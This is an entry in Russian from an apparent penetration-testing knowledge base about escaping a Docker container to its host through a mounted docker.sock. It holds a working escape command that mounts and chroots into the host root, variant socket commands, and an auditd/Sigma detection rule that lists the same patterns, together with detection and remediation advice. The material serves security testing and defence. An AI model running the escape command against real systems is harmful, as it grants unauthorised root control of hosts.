---
id: cloud-docker-socket-escape
title: "Docker: монтирование /var/run/docker.sock — выход на хост"
type: cloud
target: docker
category: cloud
difficulty: intermediate
bypass: none
tags: [docker, container-escape, privilege-escalation]
tested_on: ["Docker 24.x + монтированный сокет"]
success_rate: 0.7
risk: high
cwe: "CWE-250"
lab: null
last_verified: "2026-10-23"
references:
  - "https://attack.mitre.org/tactics/TA0007/"
  - "https://hackingthe.cloud/"
graph:
  - target: "cloud"
    type: instance_of
  - target: "privilege-escalation"
    type: leads_to
  - target: "container-escape"
    type: related_to
---

# Docker: монтирование /var/run/docker.sock — выход на хост

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host
```

## Explanation

Сокет Docker API эквивалентен root-доступу к хосту: кто может создать контейнер,
тот может смонтировать корневую ФС хоста и изменить её. Это не «уязвимость Docker»,
а архитектурная ошибка — сокет монтируют в CI-раннеры, мониторинг (cAdvisor),
Portainer, Jenkins-агенты, Watchtower. Компрометация такого контейнера = компрометация хоста.
Похожие пути: `--privileged`, `hostPath: /`, `hostPID/hostNetwork`,
capability `SYS_ADMIN`, устройства (`/dev/sda`), `apparmor=unconfined`,
а также cgroup release_agent (классический escape без сокета).

## Detection

1. Внутри контейнера: `ls -l /var/run/docker.sock`, `mount | grep docker`.
2. Проверить привилегии: `capsh --print`, `cat /proc/self/status | grep CapEff`.
3. Искать монтирования хостовых путей: `findmnt`, `/proc/self/mountinfo`.
4. Сканеры: `CDK`, `deepce`, `trivy` (misconfiguration), `docker-bench-security`.
5. На хосте: аудит событий создания контейнеров с `Binds: [/:/host]`.

## Remediation

- Не монтируйте `docker.sock` в контейнеры. Нужен билд — используйте rootless-режим,
  buildkit без привилегий, kaniko, sysbox, или отдельный билд-хост.
- Если сокет необходим — docker-socket-proxy (whitelist эндпоинтов) и read-only.
- Запретить privileged/hostPath через admission-контроль (Kyverno/OPA/PSS `restricted`).
- Rootless Docker/Podman, user namespaces (`userns-remap`), seccomp+AppArmor профили.
- Drop всех capabilities, добавлять точечно.
- Мониторинг создания контейнеров с монтированием `/`.

## Variants

```
docker -H unix:///var/run/docker.sock ps
```

```
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

## Detection rules

```yaml
title: Docker socket escape — docker run --privileged -v / из контейнера
id: f6a7b8c9-0019-4f6a-8b9c-000000000019
status: experimental
description: >-
  Процесс использует /var/run/docker.sock: запуск контейнера с монтированием
  корня узла (-v /:/host), --privileged или chroot /host — полный захват
  хоста изнутри контейнера.
references:
  - https://attack.mitre.org/techniques/T1610/
  - https://attack.mitre.org/techniques/T1086/
logsource:
  product: linux
  service: auditd
  definition: 'auditd: execve docker CLI + обращения к /var/run/docker.sock'
detection:
  socket_run:
    EventType: EXECVE
    CommandLine|contains:
      - 'docker.sock'
      - '--privileged'
      - '-v /:/host'
      - 'chroot /host'
      - '-v /:/'
  socket_access:
    EventType: PATH
    Name: /var/run/docker.sock
  filter_dockerd:
    Image|endswith:
      - /dockerd
      - /containerd
      - /docker-compose
  condition: (socket_run or socket_access) and not filter_dockerd
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
  - Name
falsepositives:
  - системные процессы dockerd/containerd (отфильтрованы) и CI-джобы, легитимно
    строящие образы через сокет — выносите их по User/ParentImage, лучше
    замените на rootless/buildah
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1610
  - cwe.250
```
